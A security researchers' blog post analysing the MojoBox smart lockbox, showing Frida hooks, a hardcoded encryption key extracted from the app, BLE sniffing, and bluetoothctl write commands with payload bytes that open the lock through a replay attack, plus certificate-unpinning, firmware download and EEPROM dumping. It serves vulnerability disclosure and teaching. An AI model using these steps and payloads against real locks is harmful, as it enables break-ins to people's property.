---
layout: post
title: MojoBox - yet another not so smartlock
subtitle: 
tags: [hacking,ble,bluetooth,physec,appsec]
comments: true
---

{: .box-note}
**Note:** This blogpost was originally posted on [whid.ninja](https://www.whid.ninja/blog/mojobox-yet-another-not-so-smartlock) by Luca and me. Reposting here to add it to my portfolio. 

**Authors**: Matteo Mandolini & Luca Bongiorni

Recently Luca came across [MojoBox](https://www.mojolock.com/) which is a _"digital lockbox focused on smart access"_. On February 26th a vulnerability was reported by LockPickingLawyer showing how this lockbox could be easily opened with a slap! The demo [video](https://www.youtube.com/watch?v=k3bS1oLEbIM) is avilable on his Youtube Channel. This vulnerability was promptly fixed by the company and a firmware upgrade was already available the day after the video was released.

This whole situation alerted the spidey sense of Luca, who immediately obtained the device with the intention of performing further analysis. Before testing the hardware part, he passed it to me (Matteo) to investigate the attack surface related to the mobile application and the Bluetooth Low Energy functions.

It turns out Luca's senses were right, MojoBox is vulnerable to **reply attack** via BLE: this means we can sniff the BLE traffic, steal the packets information and replicate them to have access to the box. Moreover, the app suffers from issues like hardcoded credentials, unobfuscated code and others.


## Intercepting BLE requests with Frida

First step, I decided to use Frida to monitor the type of information that was being sent when the lockbox was opened through the Android app.
To do this, I used [blemon](https://github.com/optiv/blemon), a useful Frida script for hooking any overridden instance methods of the android.bluetooth.BluetoothGattCallback class.

With the Frida server up and running on my rooted Android device, I just had to execute the following command:

~~~
frida -U -l blemon.js "MojoLock"
~~~

Upon clicking two times the "Open" button on the app, I obtained the following result:

![FridaResultBlemon](/assets/img/2023-03-15/2023-03-15-frida-result.png){: .mx-auto.d-block :}

At this point, it was clear that the exchanged packets were undergoing some type of encryption and most likely could not be reused (and I was wrong). This discovery prompted me to continue analyzing the APK in search of an encryption function to exploit. 

## APK static analysys

For the static analysis part, I started by downloading the APK from my device using adb. It's convenient to take note of the app package reference found in the Google Play Store URL to easily locate the APK in the phone's file-system. Once the package name is found, you can simply execute the following commands to obtain the APK:

~~~
adb shell pm path com.mojolock.app
adb pull <result_of_previous_command>
~~~

Once the APK is obtained, we decompile it as follows:

~~~
apktool d mojolock.apk
~~~

and begin inspecting the code using jadx-gui. The cool thing is that at this point we already know where to look, infact blemon told us that the BluetoothGattCallback was called from _com.reactlibraryzealinglock.controllers.ZealingController_

The app is **not obfuscated** and the code is really easy to read, infact we can see that ZealingController is using _com.reactlibraryzealinglock.controllers.utils.TeaUtil_ as a utility class. This class contains the encryption key,

```java
private static final int[] KEY = {-2062458830, 1377052040, 910521121, -1792593385};
```

the _openLock_ and _encrypt_ function. We have almost everything we need to build our own app to generate legit packets, know we only need the input of the _openLock_ function.

![OpenLockFunc](/assets/img/2023-03-15/2023-03-15-openlock.png){: .mx-auto.d-block :}

For this task Frida will help us again, with the following script I could intercept the _openLock_ inputs:

```java
Java.perform(function() {
    var TeaUtil = Java.use("com.reactlibraryzealinglock.controllers.utils.TeaUtil");

    TeaUtil.openLock.implementation = function(str, z, str2, b) {
        console.log("openLock input: str=" + str + ", z=" + z + ", str2=" + str2 + ", b=" + b);

        var result = this.openLock(str, z, str2, b);
        return result;
    }
});
```

obtaining the following result:

**openLock input: str=unknown_MAC_address_redacted, z=true, str2=1678565356261, b=1**


as we can see the _str_ parameter is an (at the moment) unknown MAC address, _z_ and _b_ are fixed and _str2_ is the current epoch time. Everything suggested that the package was indeed dependent on the epoch time and could not be reused at later points in time after the first use (wrong assumption again).

At this point, I had everything I needed to reconstruct, through a Java app, the encrypted packets that would send the signal to open the MojoBox. To do this, I reused all the code from the application and imported the same libraries used by the app into my new project. Except for the _android.text.format.Time_ which was replaced by _java.time.LocalDateTime_, which required some minor modifications to the way information on the date was derived from the epoch time.

The result seemed ok, but I needed some more understanding of how the packet needed to be sent to the MojoBox. It was time to dig deeper.


## Sniffing BLE packets with nRF52840 dongle

At [this](https://infocenter.nordicsemi.com/index.jsp?topic=%2Fug_sniffer_ble%2FUG%2Fsniffer_ble%2Fintro.html) link you can find all the information needed to install the nRF Sniffer software on the nRF52840 dongle. Once up and running, we can start seeing BLE packets going around in Wireshark.

![WireShark](/assets/img/2023-03-15/2023-03-15-wireshark.png){: .mx-auto.d-block :}

These two great tools show us something really interesting: as we can see from the screenshot above, after all the GATT discovery process, **the original app sends a _Write Request_ on handle _0x0011_ and only after that it sends a _Write Command_ on handle _0x000e_ containing the actual payload**. We need to replicate this behaviour to interact with the MojoBox

## Cracking Open the MojoBox over BLE

For this step I used my RaspberryPi and **bluetoothctl** as a BLE client. 

~~~
bluetoothctl
[bluetooth]# scan on
[NEW] Device DF:10:10:02:35:16 MojoBox-023516
[bluetooth]# scan off
Discovery stopped
[bluetooth]# connect DF:10:10:02:35:16
~~~

at this point the tool gives us the list of characteristics but, from our privious investigations, we know that we are interested in just two of them:

![Characteristics](/assets/img/2023-03-15/2023-03-15-characteristics.png){: .mx-auto.d-block :}

~~~
[MojoBox-023516]# gatt.select-attribute ff02
[MojoBox-023516:/service000c/char000f]# gatt.notify on
[CHG] Attribute /org/bluez/hci0/dev_DF_10_10_02_35_16/service000c/char000f Notifying: yes
Notify started
~~~

Now we generate a new valid encrypted packet with our Java application and send it to the MojoBox. Note that we have to split the command in two requests, the first one is 20 Bytes and the second one is 9Bytes.

~~~

[MojoBox-023516:/service000c/char000d]# gatt.write "0x68 0x01 0x18 0x28 0xFC 0x08 0xE5 0xB9 0xDA 0xDB 0xCE 0x21 0x62 0x1B 0x2A 0xF9 0xBE 0xFB 0x1E 0xE9"
Attempting to write /org/bluez/hci0/dev_DF_10_10_02_35_16/service000c/char000d
[MojoBox-023516:/service000c/char000d]# gatt.write "0xA0 0x13 0xEE 0x11 0x94 0x31 0x7D 0xDB 0x16"
Attempting to write /org/bluez/hci0/dev_DF_10_10_02_35_16/service000c/char000d
~~~

**And voilà, the lock opens!** 

![Opens](/assets/img/2023-03-15/2023-03-15-opens.gif){: .mx-auto.d-block :}


That’s not it! We can also send the same packet multiple times, **confirming that MojoBox is vulnerable to replay attack**. The oldest valid packet I tried is almost one week old and still does its job!

## Downloading MojoLock firmware for future analysis

In the resources folder of the decompiled APK we can find the file _index.bundle.android_, a file generated by React Native, a framework for developing cross-platform mobile applications using JavaScript and React. This file contains the JavaScript source code of the mobile app along with the information for downloading the firmware file for the firmware upgrade of MojoBox.

Specifically we are interested in the following function:

```javascript
        asyncGetFirmwareFile: function(t) {
            return o.default.async(function(n) {
                for (;;) switch (n.prev = n.next) {
                    case 0:
                        return n.abrupt("return", new Promise(function(n) {
                            var s = t.environment,
                                o = t.email,
                                c = t.authToken,
                                l = t.lockId;
                            return t.RNFetchBlob.config({
                                fileCache: !0,
                                timeout: 3e4
                            }).fetch('GET', (0, u.getApiURL)(s) + "/api/mv1/lockboxes/firmware_upgrade_file?user_email=" + encodeURIComponent(o) + "&user_token=" + encodeURIComponent(c) + "&id=" + encodeURIComponent(l), {}).then(function(t) {
                                n(t)
                            }).catch(function(t, s) {
                                n({
                                    statusCode: s,
                                    errorMessage: t
                                })
                            })
                        }));
                    case 1:
                    case "end":
                        return n.stop()
                }
            })
        },

```
we just need some values to download the firmware: _user_email_ (the same we use for log in) and _user_token_ & _user_token_ that we still have to find.
Let's bypass the certificate pinning with Frida and intercept some requests with BurpSuite to find the missing parameters. I used [this](https://raw.githubusercontent.com/httptoolkit/frida-android-unpinning/main/frida-script.js) Frida script for certificate unpinning. 

One of the first requests made by the app already gives us what we're looking for:

![Burp](/assets/img/2023-03-15/2023-03-15-burp.png){: .mx-auto.d-block :}

**with _auid_ being the uknown mac address we found as the input for the _openLock_ function. This means that we cannot create new valid encrypted packets without knowing this information, which obviously will be different for every device.**

At this point we can write a simple python script to download the firmware

```python

import requests

filename = "mojobox_firmware.bin"
response = requests.get("https://showmojo.com/api/mv1/lockboxes/firmware_upgrade_file?user_email=<email>&user_token=<token>&id=<id>")

with open(filename, "wb") as f:
    f.write(response.content)

```

From a first look at the firmware not much can be said, however finding strings like the one in the image below, which refers to a UART interface, bodes well for further hardware analysis.

![Ghidra](/assets/img/2023-03-15/2023-03-15-ghidra.png){: .mx-auto.d-block :}

Future work: it would be interesting to further investigate the firmware especially to reverse engineer the decryption functions and to understand how the temporary codes (requested by the mobile app, generated by the server and accepted by MojoBox) are handled.


## Bonus chapter – No need to sniff

 The mobile app contains multiple debugging messages as we can see from the image below


![DebuggingMessages](/assets/img/2023-03-15/2023-03-15-debuggingmessages.png){: .mx-auto.d-block :}

This means that if an attacker has physical access to the device where the app is installed, He/She can access the app logs via adb without being root.

![LogCat](/assets/img/2023-03-15/2023-03-15-logcat.png){: .mx-auto.d-block :}

As we already know the data we read after “WRITE SUCCESS” can be used to open the MojoBox as many times as we want.

Moreover, we could find username and password stored in an unencrypted SQLite database, which is not a good idea.

![SQLite](/assets/img/2023-03-15/2023-03-15-sqlite.png){: .mx-auto.d-block :}


As a final consideration, it seems that the _user_code_ parameter, that we already saw being sent in a GET request while intercepting the requests with Burp, never changes and is the only parameter needed, along with the user email, to retrieve all users’ information. Sending such a critical information about the user through GET request should be obviously considered a bad practice.


## Hardware Analysis

To analyze the MojoBox hardware from a security perspective, we first conducted some passive recon to realize what kind of components we would need to interact with. The information from the [FCC](https://www.whid.ninja/blog/mojobox-yet-another-not-so-smartlock#:~:text=information%20from%20the-,FCC,-database%20gave%20us) database gave us an initial idea. We then opened the device and found the following chipset

![Chip](/assets/img/2023-03-15/2023-03-15-chip.jpeg){: .mx-auto.d-block :}

It is from a company called Pixart and not very common. We found a similar one here https://www.pixart.com/products-detail/87/PAR2801QN-GHVC . As we can see from the table on this tech brochure,  the MCU can handle many peripherals interfaces:

![Peripherals](/assets/img/2023-03-15/2023-03-15-peripherals.png){: .mx-auto.d-block :}

So we connected to the UART interface that we found on the PCB and then tried to intercept traffic using a Logic Analyzer.


![UART](/assets/img/2023-03-15/2023-03-15-UART.png){: .mx-auto.d-block :} 

Turning off and on the and interacting with the device through the mobile app did not trigger the output of meaningful information as shown in the image below

![LogicAnalyzer](/assets/img/2023-03-15/2023-03-15-logicanalyzer.png){: .mx-auto.d-block :} 

At this point we started to analyze the EEPROM which uses the I2C protocol to communicate with the CPU. We unsoldered it from the PCB and used a CH341A chip to analyze its content.

![EEPROM](/assets/img/2023-03-15/2023-03-15-EEPROM.gif){: .mx-auto.d-block :} 

Inside this memory flash we found what appears to be an access list with our pincode and all the temporary pincodes we used. Having this information in plain text is definitely not a best practice, however considering the difficulty to access the I2C flash (i.e. first need to open the lock and then unscrew the PCB from the case), it can be rated as a minor issue.

![EEPROMcontent](/assets/img/2023-03-15/2023-03-15-EEPROM-content.jpeg){: .mx-auto.d-block :} 


## Conclusions

* It is never a good idea to reinvent the wheel: The Security Manager (SM) and Generic Access Profile (GAP) levels of the BLE core specification specify rules and algorithms to allow secure connections.
* Always follow code best practices and code review
* Security is a process not a product, therefore it must be applied in each phase of the life cycle of a product. 

**Stay tuned for future works. Thank you!**
